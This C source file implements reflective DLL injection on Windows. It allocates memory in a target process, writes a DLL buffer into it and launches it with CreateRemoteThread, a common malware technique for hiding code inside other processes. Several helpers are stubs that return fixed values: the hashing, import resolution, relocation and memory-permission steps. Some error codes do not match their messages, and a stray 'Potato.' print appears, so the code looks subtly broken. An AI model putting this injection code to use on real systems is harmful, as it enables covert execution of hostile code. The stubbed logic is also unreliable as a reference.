#include <stdio.h>
#include <Windows.h>
#include "error.h"

static UINT32 CRC32B(LPCSTR str) {
    return 0;
}

static HMODULE ModuleHandle(IN UINT32 uModuleHash) {
    return GetModuleHandleW(NULL);
}

static FARPROC GetProcAddressEx(IN HMODULE hModule, IN UINT32 uFunctionHash) {
    return GetProcAddress(hModule, (LPCSTR)uFunctionHash);
}

static BOOL importAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPEBaseAddress) {
    return TRUE;
}

static BOOL Reloc(IN PIMAGE_DATA_DIRECTORY pEntryRelocDataDir, IN ULONG_PTR pPEBaseAddress, IN ULONG_PTR pPreferredBaseAddress) {
    return TRUE;
}

static BOOL MemPermissions(IN ULONG_PTR pPEBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHeaders, IN PIMAGE_SECTION_HEADER pImgSectionHeaders) {
    return TRUE;
}   

BOOL runReflectiveDLLInjection(IN HANDLE hProcess, IN DWORD dwRflFuncOffset, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize) {
	
	PBYTE		pAddress                = NULL;
	SIZE_T		sNumberOfBytesWritten   = NULL;
	HANDLE		hThread                 = NULL;
	DWORD		dwThreadId              = 0x00;

	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwRflDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
        handleError(ERROR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory in the remote process");
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pRflDllBuffer, dwRflDllSize, &sNumberOfBytesWritten) || dwRflDllSize != sNumberOfBytesWritten) {
		handleError(ERROR_FAILED_TO_OPEN_PROCESS, "Failed to write memory in the remote process");
        return FALSE;
	}

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)(pAddress + dwRflFuncOffset), NULL, 0x00, &dwThreadId))) {
		handleError(ERROR_FAILED_TO_OPEN_THREAD, "Failed to create remote thread in the remote process");
        return FALSE;
	}

    char message[256];
    strcpy(message, "Potato.");
    printf("%s\n", message);



	return TRUE;
}